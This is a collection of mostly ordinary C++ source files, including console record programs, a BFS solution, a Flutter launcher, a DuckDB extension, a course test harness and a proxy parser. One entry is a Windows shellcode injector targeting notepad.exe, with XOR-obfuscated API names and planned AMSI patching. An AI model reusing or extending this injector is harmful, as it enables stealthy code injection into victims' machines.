    "#include <iostream>\r\n#include <fstream>\r\n#include <cstring>\r\nusing namespace std;\r\n\r\nstruct employee {\r\n    int roll, bps;\r\n    int emp_id;\r\n    char name[20], fname[22], des[12];\r\n    int salary;\r\n    int age;\r\n    employee* next;\r\n\r\n    void getdata() {\r\n        cout << \"Enter name: \";\r\n        cin >> name;\r\n        cout << \"Enter father's name: \";\r\n        cin >> fname;\r\n\r\n        char q[6] = {'a', 'd', 'm', 'i', 'n'}, q1[5] = {'t', 'e', 'c', 'h'}, q2[12] = {'m', 'a', 'n', 'a', 'g', 'e', 'r', 'i', 'a', 'l'},\r\n            q3[7] = {'o', 't', 'h', 'e', 'r'}, qq[6] = {'A', 'd', 'm', 'i', 'n'}, q4[5] = {'T', 'e', 'c', 'h'}, q5[12] = {'M', 'a', 'n', 'a', 'g', 'e', 'r', 'i', 'a', 'l'}, q6[7] = {'O', 't', 'h', 'e', 'r'};\r\n        cout << \"Enter designation (must be either Admin, Tech, Managerial, or Other): \";\r\n        do {\r\n            cin >> des;\r\n            if (strcmp(des, q) == 0 || strcmp(des, q1) == 0 || strcmp(des, q2) == 0 || strcmp(des, q3) == 0 ||\r\n                strcmp(des, qq) == 0 || strcmp(des, q4) == 0 || strcmp(des, q5) == 0 || strcmp(des, q6) == 0) {\r\n                cout << \"Designation: \" << des << endl;\r\n                break;\r\n            } else {\r\n                cout << \"Invalid designation, try again!\" << endl;\r\n            }\r\n        } while (true);\r\n\r\n        cout << \"Enter employee BPS (must be between 1 to 22): \";\r\n        do {\r\n            cin >> bps;\r\n            if (bps >= 1 && bps <= 22)\r\n                break;\r\n            else\r\n                cout << \"Invalid BPS, please enter again within the limit!\" << endl;\r\n        } while (true);\r\n\r\n        int y = ((bps * 10000) * 45) / 100;\r\n        salary = (bps * 10000) + y;\r\n        cout << \"Employee salary: \" << salary << endl;\r\n\r\n        cout << \"Enter employee ID (must be between 7777 to 9999): \";\r\n        do {\r\n            cin >> emp_id;\r\n            if (emp_id >= 7777 && emp_id < 9999)\r\n                break;\r\n            else\r\n                cout << \"Invalid ID, please enter again within the limit!\" << endl;\r\n        } while (true);\r\n\r\n        cout << \"Enter employee age (must be between 18 to 60): \";\r\n        do {\r\n            cin >> age;\r\n            if (age >= 18 && age < 61)\r\n                break;\r\n            else\r\n                cout << \"Invalid age, please enter again within the limit!\" << endl;\r\n        } while (true);\r\n    }\r\n\r\n    void addrecord() {\r\n        fstream f;\r\n        employee s;\r\n        f.open(\"record.txt\", ios::app | ios::binary);\r\n        s.getdata();\r\n        f.write((char*)&s, sizeof(s));\r\n        f.close();\r\n    }\r\n\r\n    void showdata() {\r\n        cout << \"\\nDesignation: \" << des << endl;\r\n        cout << \"Name: \" << name << \"\\nFather's name: \" << fname << \"\\nBPS: \" << bps << \"\\nAge: \" << age << \"\\nEmployee ID: \" << emp_id << endl;\r\n        cout << \"---------------------------------\" << endl;\r\n    }\r\n\r\n    void display() {\r\n        system(\"cls\");\r\n        roll = 1;\r\n        fstream read_file;\r\n        employee s;\r\n        read_file.open(\"record.txt\", ios::app | ios::in | ios::out | ios::binary);\r\n\r\n        if (!read_file)  \r\n            cout << \"\\nFile not found.\" << endl;\r\n        else {\r\n            while (!read_file.eof()) {\r\n                read_file.read((char*)&s, sizeof(s));\r\n                cout << \"No. \" << roll << endl;\r\n                s.showdata();\r\n                roll++;\r\n            }\r\n            read_file.close();\r\n        }\r\n    }\r\n\r\n    void search() {\r\n        system(\"cls\");\r\n        fstream search_data;\r\n        employee s;\r\n        search_data.open(\"record.txt\", ios::in | ios::binary);\r\n        int x;\r\n        cout << \"\\nPress: \\n1 for Search by emp_id \\n2 for Search by Name \\n3 for Search by age \\n4 for Search Eldest Employee \"\r\n             << \"\\n5 for Search Youngest Employee \\n6 for Search by BPS \\n7 for Search by designation\" << endl;\r\n        cin >> x;\r\n        switch (x) {\r\n            case 1: {\r\n                system(\"cls\");\r\n                int Search_id;\r\n                cout << \"\\t\\tEnter ID to be searched: \";\r\n                cin >> Search_id;\r\n                while (search_data.read((char*)this, sizeof(*this))) {\r\n                    if (emp_id == Search_id) {\r\n                        showdata();\r\n                        break;\r\n                    }\r\n                }\r\n                if (emp_id != Search_id)\r\n                    cout << \"\\n\\t\\tNot Found\" << endl;\r\n                search_data.close();\r\n            } break;\r\n            case 2: {\r\n                system(\"cls\");\r\n                char sname[23];\r\n                cout << \"\\n\\t\\tEnter Name to be searched: \";\r\n                cin >> sname;\r\n                while (search_data.read((char*)this, sizeof(*this))) {\r\n                    if (strcmp(name, sname) == 0) {\r\n                        showdata();\r\n                        break;\r\n                    }\r\n                }\r\n                if (strcmp(name, sname) != 0)\r\n                    cout << \"\\n\\t\\tNot Found\" << endl;\r\n                search_data",
    "#include <iostream>\n#include <vector>\n#include <queue>\n#include <string>\n#include <algorithm>\n#include <cmath>\n#include <map>\n#include <set>\n#include <stack>\n#include <sstream>\n\nusing namespace std;\n\nint N, M, K;\nint arr[1001][1001];\nint visited[1001][1001][10] = {0};\nint x[4] = {0, 0, -1, 1};\nint y[4] = {-1, 1, 0, 0};\nqueue<int> que1;\nqueue<int> que2;\nqueue<int> que3;\nqueue<int> que4;\n\nint bfs() {\n    que1.push(1);\n    que2.push(1);\n    que3.push(1);\n    que4.push(0);\n    int result = -1;\n    while (!que1.empty()) {\n        int row = que1.front();\n        que1.pop();\n        int col = que2.front();\n        que2.pop();\n        int day = que3.front();\n        que3.pop();\n        int indent = que4.front();\n        que4.pop();\n        if (visited[row][col][indent] != 0 || result >= 0)\n            continue;\n        visited[row][col][indent] = 1;\n        if (row == N && col == M) {\n            result = day;\n            continue;\n        }\n        for (int i = 0; i < 4; i++) {\n            int new_row = row + x[i];\n            int new_col = col + y[i];\n            if (new_row <= 0 || new_row > N)\n                continue;\n            if (new_col <= 0 || new_col > M)\n                continue;\n            if (arr[new_row][new_col] == 1 && indent == K)\n                continue;\n            que1.push(new_row);\n            que2.push(new_col);\n            que3.push(day + 1);\n            que4.push(indent + arr[new_row][new_col]);\n        }\n\n    }\n    return result;\n}\n\nint main() {\n    cin.tie(NULL);\n    ios::sync_with_stdio(false);\n    cin >> N >> M >> K;\n    for (int i = 1; i <= N; i++) {\n        string str;\n        cin >> str;\n        for (int j = 1; j <= M; j++) {\n            arr[i][j] = str[j - 1] - '0';\n        }\n    }\n    cout << bfs();\n\n\n    return 0;\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"news_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <string>\nusing namespace std;\n\nstruct Product {\n    int id;\n    string name;\n    double price;\n};\n\nconst string filename = \"products.txt\";\n\nvector<Product> loadProducts() {\n    vector<Product> products;\n    ifstream file(filename);\n    Product p;\n    while (file >> p.id) {\n        file.ignore();\n        getline(file, p.name);\n        file >> p.price;\n        file.ignore();\n        products.push_back(p);\n    }\n    return products;\n}\n\nvoid saveProducts(const vector<Product>& products) {\n    ofstream file(filename);\n    for (const auto& p : products) {\n        file << p.id << \"\\n\" << p.name << \"\\n\" << p.price << \"\\n\";\n    }\n}\n\nvoid createProduct() {\n    vector<Product> products = loadProducts();\n    Product p;\n    cout << \"Enter ID: \"; cin >> p.id;\n    cin.ignore();\n    cout << \"Enter Name: \"; getline(cin, p.name);\n    cout << \"Enter Price: \"; cin >> p.price;\n    products.push_back(p);\n    saveProducts(products);\n    cout << \"Product added!\\n\";\n}\n\nvoid readProducts() {\n    vector<Product> products = loadProducts();\n    for (const auto& p : products) {\n        cout << \"ID: \" << p.id << \"\\nName: \" << p.name << \"\\nPrice: $\" << p.price << \"\\n\\n\";\n    }\n    if (products.empty()) cout << \"No products found.\\n\";\n}\n\nvoid updateProduct() {\n    vector<Product> products = loadProducts();\n    int id; bool found = false;\n    cout << \"Enter ID to update: \"; cin >> id;\n    for (auto& p : products) {\n        if (p.id == id) {\n            found = true;\n            cin.ignore();\n            cout << \"Enter new Name: \"; getline(cin, p.name);\n            cout << \"Enter new Price: \"; cin >> p.price;\n            saveProducts(products);\n            cout << \"Product updated!\\n\";\n            break;\n        }\n    }\n    if (!found) cout << \"Product not found.\\n\";\n}\n\nvoid deleteProduct() {\n    vector<Product> products = loadProducts();\n    int id; bool found = false;\n    cout << \"Enter ID to delete: \"; cin >> id;\n    for (auto it = products.begin(); it != products.end(); ++it) {\n        if (it->id == id) {\n            found = true;\n            products.erase(it);\n            saveProducts(products);\n            cout << \"Product deleted!\\n\";\n            break;\n        }\n    }\n    if (!found) cout << \"Product not found.\\n\";\n}\n\nint main() {\n    int choice;\n    do {\n        cout << \"\\n1. Add Product\\n2. View Products\\n3. Update Product\\n4. Delete Product\\n5. Exit\\nChoose: \";\n        cin >> choice;\n        if (choice == 1) createProduct();\n        else if (choice == 2) readProducts();\n        else if (choice == 3) updateProduct();\n        else if (choice == 4) deleteProduct();\n        else if (choice == 5) cout << \"Exiting...\\n\";\n        else cout << \"Invalid choice.\\n\";\n    } while (choice != 5);\n    return 0;\n}",
    "#define DUCKDB_EXTENSION_MAIN\n\n#include \"chsql_system_extension.hpp\"\n#include \"duckdb.hpp\"\n#include \"duckdb/common/exception.hpp\"\n#include \"duckdb/function/table_function.hpp\"\n#include \"duckdb/function/scalar_function.hpp\"\n#include \"duckdb/main/extension_util.hpp\"\n#include \"duckdb/main/client_context.hpp\"\n#include \"duckdb/catalog/catalog.hpp\"\n#include \"duckdb/catalog/catalog_entry/schema_catalog_entry.hpp\"\n#include \"duckdb/catalog/catalog_entry/table_catalog_entry.hpp\"\n#include \"duckdb/main/connection.hpp\"\n\n#include \"duckdb/main/query_result.hpp\"\n#include \"duckdb/main/materialized_query_result.hpp\"\n#include \"duckdb/common/helper.hpp\"\n\n#include <fstream>\n#include <sstream>\n#if defined(__linux__)\n#include <unistd.h>\n#include <sys/sysinfo.h>\n#include <iterator>\n#elif defined(_WIN32)\n#include <windows.h>\n#elif defined(__APPLE__)\n#include <unistd.h>\n#include <sys/sysctl.h>\n#include <sys/time.h>\n#include <time.h>\n#elif defined(__EMSCRIPTEN__)\n// #include <emscripten.h>\n#endif\n\n\nnamespace duckdb {\n\nstruct SystemDatabasesData : public TableFunctionData {\n    vector<Value> names;\n    vector<Value> engines;\n    vector<Value> data_paths;\n    vector<Value> metadata_paths;\n    vector<Value> uuids;\n    vector<Value> engine_full;\n    vector<Value> comments;\n    idx_t offset = 0;\n};\n\nstruct SystemTablesData : public TableFunctionData {\n    vector<Value> databases;\n    vector<Value> names;\n    vector<Value> uuids;\n    vector<Value> engines;\n    vector<Value> is_temporary;\n    vector<Value> data_paths;\n    vector<Value> metadata_paths;\n    vector<Value> metadata_modification_times;\n    vector<Value> metadata_versions;\n    vector<Value> create_table_queries;\n    idx_t offset = 0;\n};\n\nstruct SystemColumnsData : public TableFunctionData {\n    vector<Value> databases;\n    vector<Value> tables;\n    vector<Value> column_names;\n    vector<Value> column_types;\n    vector<Value> positions;\n    vector<Value> comments;\n    idx_t offset = 0;\n};\n\nstruct SystemFunctionsData : public TableFunctionData {\n    vector<Value> names;\n    vector<Value> is_aggregate;\n    vector<Value> case_insensitive;\n    vector<Value> descriptions;\n    idx_t offset = 0;\n};\n\nstatic void SystemDatabasesFunction(ClientContext &context, TableFunctionInput &data_p, DataChunk &output) {\n    auto &data = (SystemDatabasesData &)*data_p.bind_data;\n    if (data.offset >= data.names.size()) {\n        return;\n    }\n\n    idx_t count = 0;\n    while (data.offset < data.names.size() && count < STANDARD_VECTOR_SIZE) {\n        output.SetValue(0, count, data.names[data.offset]);           // name\n        output.SetValue(1, count, data.engines[data.offset]);         // engine\n        output.SetValue(2, count, data.data_paths[data.offset]);      // data_path\n        output.SetValue(3, count, data.metadata_paths[data.offset]);  // metadata_path\n        output.SetValue(4, count, data.uuids[data.offset]);           // uuid\n        output.SetValue(5, count, data.engine_full[data.offset]);     // engine_full\n        output.SetValue(6, count, data.comments[data.offset]);        // comment\n        \n        count++;\n        data.offset++;\n    }\n\n    output.SetCardinality(count);\n}\n\nstatic void SystemTablesFunction(ClientContext &context, TableFunctionInput &data_p, DataChunk &output) {\n    auto &data = (SystemTablesData &)*data_p.bind_data;\n    if (data.offset >= data.databases.size()) {\n        return;\n    }\n\n    idx_t count = 0;\n    while (data.offset < data.databases.size() && count < STANDARD_VECTOR_SIZE) {\n        output.SetValue(0, count, data.databases[data.offset]);       // database\n        output.SetValue(1, count, data.names[data.offset]);           // name\n        output.SetValue(2, count, data.uuids[data.offset]);           // uuid\n        output.SetValue(3, count, data.engines[data.offset]);         // engine\n        output.SetValue(4, count, data.is_temporary[data.offset]);    // is_temporary\n        output.SetValue(5, count, data.data_paths[data.offset]);      // data_path\n        output.SetValue(6, count, data.metadata_paths[data.offset]);  // metadata_path\n        output.SetValue(7, count, data.metadata_modification_times[data.offset]); // metadata_modification_time\n        output.SetValue(8, count, data.metadata_versions[data.offset]); // metadata_version\n        output.SetValue(9, count, data.create_table_queries[data.offset]); // create_table_query\n        \n        count++;\n        data.offset++;\n    }\n\n    output.SetCardinality(count);\n}\n\nstatic void SystemFunctionsFunction(ClientContext &context, TableFunctionInput &data_p, DataChunk &output) {\n    auto &data = (SystemFunctionsData &)*data_p.bind_data;\n    if (data.offset >= data.names.size()) {\n        return;\n    }\n\n    idx_t count = 0;\n    while (data.offset < data.names.size() && count < STANDARD_VECTOR_SIZE) {\n        output.SetValue(0, count, data.names[data.offset]);           // name\n        output.SetValue(1, count, data.is_aggregate[data.offset]);    // is_aggregate\n        output.SetValue(2, count, data.cas",
    "#include <iostream>\n#include <iomanip>\n#include <exception>\n#include <string>\n#include <type_traits>\n#include <forward_list>\n#include \"Filesystem.h\"\n#include \"Filesystem.h\"   // intentional\n#include \"Directory.h\"\n#include \"Directory.h\"    // intentional\n#include \"File.h\"\n#include \"File.h\"         // intentional\n#include \"Flags.h\"\n#include \"Flags.h\"        // intentional\n\n#ifndef SENECA_FILESYSTEM_H\n    #error \"The header guard for 'Filesystem.h' doesn't follow the convention!\"\n#endif\n#ifndef SENECA_DIRECTORY_H\n    #error \"The header guard for 'Directory.h' doesn't follow the convention!\"\n#endif\n#ifndef SENECA_FILE_H\n    #error \"The header guard for 'File.h' doesn't follow the convention!\"\n#endif\n#ifndef SENECA_FLAGS_H\n    #error \"The header guard for 'Flags.h' doesn't follow the convention!\"\n#endif\n\nint cout = 0; // won't compile if headers don't follow convention\n\nvoid printLine() {\n    std::cout << \"--------------------------\\n\";\n}\n\nvoid printHeader(std::string label) {\n    size_t padLeft = (26 - label.length()) / 2;\n\n    printLine();\n    std::cout << std::setw(padLeft) << \" \" << label << std::endl;\n    printLine();\n}\n\nint main(int argc, char** argv) {\n    std::cout << \"Command Line:\\n\";\n    std::cout << \"--------------------------\\n\";\n    for (int i = 0; i < argc; ++i)\n        std::cout << std::setw(3) << i + 1 << \": \" << argv[i] << '\\n';\n    std::cout << \"--------------------------\\n\\n\";\n\n    /*************************************************\n     * Creating the Filesystem\n     **************************************************/\n    ::printHeader(\"FILESYSTEM\");\n\n    try {\n        seneca::Filesystem failedFs(\"non-existentfile\");\n    } catch (...) {\n        std::cout << \"**EXPECTED EXCEPTION: Filesystem not created with invalid filename.\\n\" << std::endl;\n    }\n\n    if(std::is_copy_constructible<seneca::Filesystem>::value || std::is_copy_assignable<seneca::Filesystem>::value) {\n        std::cout << \"**EXCEPTION: Filesystem should not support copy operations.\\n\" << std::endl;\n    }\n\n    if ((!std::is_move_constructible<seneca::Filesystem>::value) || (!std::is_move_assignable<seneca::Filesystem>::value)) {\n        std::cout << \"**EXCEPTION: Filesystem should support move operations.\\n\" << std::endl;\n    }\n\n    seneca::Filesystem fs(argv[1]);\n\n    std::vector<seneca::FormatFlags> fflags;\n    \n    std::vector<seneca::OpFlags> oflags;\n    oflags.push_back(seneca::OpFlags::RECURSIVE);\n\n    seneca::Directory* working_dir = fs.get_current_directory();\n    working_dir->display(std::cout);\n\n    ::printLine();\n\n    /*************************************************\n     * Changing directories\n     **************************************************/\n    ::printHeader(\"CHANGE DIR\");\n    fflags.push_back(seneca::FormatFlags::LONG);\n\n    try {\n        working_dir = fs.change_directory(\"pics\");\n    } catch(std::invalid_argument&) {\n        std::cout << \"**EXPECTED EXCEPTION: Couldn't change directory to invalid directory.\\n\" << std::endl;\n    }\n\n    working_dir = fs.change_directory(\"images/\");\n    working_dir->display(std::cout, fflags);\n\n    ::printLine();\n\n    /*************************************************\n     * Finding a file in a directory\n     **************************************************/\n    ::printHeader(\"FIND\");\n\n    seneca::File* elephant_image = dynamic_cast<seneca::File*>(working_dir->find(\"elephant\", oflags));\n    if(!elephant_image) {\n        std::cout << \"**EXPECTED ERROR: File elephant not found in \" << working_dir->path() << \" recursively\\n\" << std::endl;\n    }\n\n    elephant_image = dynamic_cast<seneca::File*>(working_dir->find(\"elephant.png\"));\n    if (!elephant_image) {\n        std::cout << \"**EXPECTED ERROR: File elephant.png not found in \" << working_dir->path() <<  \" non-recursively\\n\" << std::endl;\n    }\n\n    elephant_image = dynamic_cast<seneca::File*>(working_dir->find(\"elephant.png\", oflags));\n\n    std::cout << elephant_image->path() << \" was found in fileystem\" << std::endl;\n\n    ::printLine();\n\n\n    /*************************************************\n     * Adding a directory to another directory\n     **************************************************/\n    ::printHeader(\"ADD TO DIRECTORY\");\n    seneca::Directory* classified = new seneca::Directory(\"classified/\");\n    *classified += new seneca::File(\".aliens.txt\", \"Are aliens real? Go to Area 51 and find out!\");\n    *classified += new seneca::File(\".polls.txt\", \"Polling results for the current election are in here.\");\n\n    std::cout << \"Created directory \" << classified->name() << std::endl;\n    classified->display(std::cout, fflags);\n\n    working_dir = fs.change_directory();\n    working_dir = fs.change_directory(\"documents/\");\n    std::cout << \"\\nAdding \" << classified->name() << \" to \" << working_dir->path() << std::endl;\n\n    *working_dir += classified;\n\n    working_dir->display(std::cout, fflags);\n\n    ::printLine();\n\n    /*************************************************\n     * Removing a directory\n     ***************************",
    "#include <windows.h>\n#define TH32CS_SNAPPROCESS 0x00000002 //Used by CreateToolhelp32Snapshot.\n#define REMOTE_MEM_BUFF_SIZE 90969\n#include <stdlib.h>\n#include <stdio.h>\n#define FAVICON_ICO \n#include <iostream>\n//ico for shellcode\n\n/*\nTo Do\t\n\t\t\tBugs\n\t[] CreateToolhelp32Snapshot doesnt seem to work with GetProcAddress when provided in any way other than a string literal??\n\t[] VirtualProtectEx doesnt seem to work with GetProcAddress when provided in any way other than when I provide VirtualProtectEx as a string literal\n\t[] Notepad.exe is deXOR'd into notepad.bfl. This obviously is preventing implementation of XOR functionality into the strcmpiA function.\n\t[]Decode shellcode once it is injected into remote buffer\n\n\n\t\t\tLater \n\t[] Base64 encode/decode\n\t[] Put shellcode into FAVICON_ICO .ico file, so payload is in the .rsrc section.\n\t[] AMSI patch or some other patching method implemented into the program.\n\n*/\n\n\n\n\n\n\n\nunsigned char shellcode[] = { //Payload we want to execute.\n  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,\n  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,\n  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,\n  0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,\n  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,\n  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,\n  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,\n  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,\n  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,\n  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,\n  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,\n  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,\n  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,\n  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,\n  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,\n  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,\n  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,\n  0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,\n  0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,\n  0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,\n  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,\n  0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,\n  0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 \n};\nsize_t shellcode_length = sizeof(shellcode);\n\n//XOR encoded uchar arrays that contain the names of each function we are passing to GetProcAddress, for our indirect syscall method\nunsigned char kernel[] = { 0x8, 0xb, 0x14, 0x24, 0x10, 0x25, 0x52, 0x54, 0x6a, 0x34, 0x14, 0x28 }; //kernel32.dll is not a funct, but we need to specify a module for GetProcAddress, kernel32.dll is the relevant module of all below XOR'd functions.\nunsigned char virAlloc[] = { 0x15, 0x7, 0x14, 0x3e, 0x0, 0x28, 0xd, 0x27, 0x28, 0x3c, 0x17, 0x27 };\nunsigned char virProtec[] = { 0x15, 0x7, 0x14, 0x3e, 0x0, 0x28, 0xd, 0x36, 0x36, 0x3f, 0xc, 0x21, 0xd, 0x32 };\nunsigned char rtlMoveMem[] = { 0x11, 0x1a, 0xa, 0x7, 0x1a, 0x3f, 0x4, 0x2b, 0x21, 0x3d, 0x17, 0x36, 0x17 };\nunsigned char CreateToolhelp32SnapshotFlags[] = { 0x17, 0x26, 0x55, 0x78, 0x36, 0x1a, 0x3e, 0x35, 0xa, 0x11, 0x28, 0x14, 0x3c, 0x9, 0x37, 0x1, 0x0, 0x3b };\nunsigned char Process32First[] = { 0x13, 0x1c, 0x9, 0x29, 0x10, 0x3a, 0x12, 0x55, 0x76, 0x16, 0x11, 0x36, 0x1d, 0x32 };\nunsigned char CreateToolhelp32SnapshotStr[] = { 0x0, 0x1c, 0x3, 0x2b, 0x1, 0x2c, 0x35, 0x9, 0x2b, 0x3c, 0x10, 0x21, 0x2, 0x36, 0x47, 0x76, 0x0, 0x6, 0xb, 0x26, 0x38, 0x2c, 0x1f, 0x15 };\nunsigned char Process32Next[] = { 0x13, 0x1c, 0x9, 0x29, 0x10, 0x3a, 0x12, 0x55, 0x76, 0x1e, 0x1d, 0x3c, 0x1a };\nunsigned char CreateRemoteThreadStr[] = { 0x0, 0x1c, 0x3, 0x2b, 0x1, 0x2c, 0x33, 0x3, 0x29, 0x3f, 0xc, 0x21, 0x3a, 0x2e, 0x6, 0x21, 0x32, 0xc};\nunsigned char targetProcess[] = { 0x2d, 0x1, 0x12, 0x2f, 0x5, 0x28, 0x5, 0x9, 0x26, 0x36, 0x1a }; //Notepad.exe XOR'd\nunsigned char virtualAllocEx[] = { 0x15, 0x7, 0x14, 0x3e, 0x0, 0x28, 0xd, 0x27, 0x28, 0x3c, 0x17, 0x27, 0x2b, 0x3e }; \nunsigned char writeProcessMemoryStr[] = { 0x14, 0x1c, 0xf, 0x3e, 0x10, 0x19, 0x13, 0x9, 0x27, 0x35, 0xb, 0x37, 0x23, 0x23, 0x19, 0x2b, 0x21, 0x11 };\nunsigned char openProcessStr[] = { 0xc, 0x1e, 0x3, 0x24, 0x25, 0x3b, 0xe, 0x5, 0x21, 0x23, 0xb };\nunsigned char virtualProtectExStr[] = { 0x15, 0x7, 0x14, 0x3e, 0x0, 0x28, 0xd, 0x36, 0x36, 0x3f, 0xc, 0x21, 0xd, 0x32, 0x31, 0x3c };\n\nunsigned int targetProcessId; //Not XOR'd as its only a predec for a runtime variable.\n\n/*\nI literally have no clue why but I cannot for the life of me get, GetProcAddress to work with the param CreateToolHelp32Snapshot, unless ",
    "#include <iostream>\n#include <cstring> // Add this include for strtok_r\n#include <cstdlib> // Add this include for malloc, realloc, free\n#include <cstdarg> // Add this include for va_list, va_start, va_end\n#include <cstdio>  // Add this include for vfprintf\n#include <cerrno>  // Add this include for errno\n#include \"proxy_parse.hpp\"\n\n#define DEFAULT_NHDRS 8   // initial size of header\n#define MAX_REQ_LEN 65535 // max Request length\n#define MIN_REQ_LEN 4     // min req length\n#define DEBUG 1           // Add this line near the top with other defines\n\nstatic const char *root_abs_path = \"/\";\n\nusing namespace std;\n// debugging info\nvoid debug(const char *format, ...)\n{\n    va_list args;\n    if (DEBUG)\n    {\n        va_start(args, format);\n        vfprintf(stderr, format, args);\n        va_end(args);\n    }\n}\n\nint ParsedHeader_set(struct ParsedRequest *PR, const char *key, const char *value)\n{\n    struct ParsedHeader *PH;\n    ParsedHeader_remove(PR, key); // removing existing header\n    if (PR->headerslen <= PR->headersused + 1)\n    {\n        // resizing the headers array\n        PR->headerslen = PR->headerslen * 2;\n        PR->headers = (struct ParsedHeader *)realloc(PR->headers, PR->headerslen * sizeof(struct ParsedHeader));\n        if (!PR->headers)\n            return -1;\n    }\n    PH = PR->headers + PR->headersused; // next header slot\n    PR->headersused++;\n    PH->key = (char *)malloc(strlen(key) + 1);\n    // allocating memory for key and copying the key\n    memcpy(PH->key, key, strlen(key) + 1);\n    PH->key[strlen(key)] = '\\0';\n\n    PH->val = (char *)malloc(strlen(value) + 1);\n    memcpy(PH->val, value, strlen(value));\n    PH->val[strlen(value)] = '\\0';\n\n    PH->keylen = strlen(key) + 1;\n    PH->valuelen = strlen(value) + 1;\n    return 0;\n}\n\n// getting the parsedHeader with the specific key\nstruct ParsedHeader *ParsedHeader_get(struct ParsedRequest *PR, const char *key)\n{\n    size_t i = 0;\n    struct ParsedHeader *tmp; // pointer to a structure of parsedHeader\n    // return pointer to a parsedHeader structure if key found in the ParsedRequest structure\n    while (PR->headersused > i)\n    {\n        tmp = (PR->headers) + i; // current header\n        if (tmp->key && key && strcmp(tmp->key, key) == 0)\n        {\n            return tmp; // returning the header if key found in the headers and the key is not null\n        }\n        i++;\n    }\n    return NULL;\n}\n\n// remove the header with the specific key\nint ParsedHeader_remove(struct ParsedRequest *PR, const char *key)\n{\n    struct ParsedHeader *tmp;\n    tmp = ParsedHeader_get(PR, key);\n    if (tmp == NULL)\n        return -1;\n\n    free(tmp->key);\n    free(tmp->val);\n    tmp->key = NULL;\n    tmp->val = NULL;\n    return 0;\n}\n\n// modifying the header with the given key and\n// giving it to a new value\n// return 1 for success and 0 for failure\n\nint ParsedHeader_modify(struct ParsedRequest *PR, const char *key, const char *newValue)\n{\n    struct ParsedHeader *tmp;\n    tmp = ParsedHeader_get(PR, key);\n    if (tmp != NULL)\n    {\n        if (tmp->valuelen < strlen(newValue) + 1)\n        {\n            tmp->valuelen = strlen(newValue) + 1;\n            tmp->val = (char *)realloc(tmp->val, tmp->valuelen);\n        }\n        strcpy(tmp->val, newValue);\n        return 1;\n    }\n    return 0;\n}\n// initializing the headers array in ParsedRequest structure\n\nvoid ParsedHeader_create(struct ParsedRequest *PR)\n{\n    // allocating the memory for array of headers structure\n    PR->headers = (struct ParsedHeader *)malloc(sizeof(struct ParsedHeader) * DEFAULT_NHDRS);\n    PR->headerslen = DEFAULT_NHDRS; // set headers len\n    PR->headersused = 0;            // currently no headers are being used\n}\n// fn calculating the length of the line of 